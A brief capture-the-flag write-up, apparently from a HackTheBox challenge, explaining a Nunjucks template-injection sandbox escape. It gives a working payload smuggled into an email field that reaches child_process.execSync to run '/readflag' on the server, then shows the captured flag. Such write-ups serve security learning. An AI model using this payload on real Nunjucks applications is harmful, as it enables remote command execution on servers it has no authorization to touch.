Due to the fact we can interact directly with the `nunjucks.renderString` so using the constructor method from the Object class we can run normal javascript escaping the sandbox.

https://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine

Post this as the email address to send to
```js
email@example.com;{{ range.constructor(\"return global.process.mainModule.require('child_process').execSync('/readflag').toString()\")() }}
```

CHTB{I_can_f1t_my_p4yl04ds_3v3rywh3r3!} 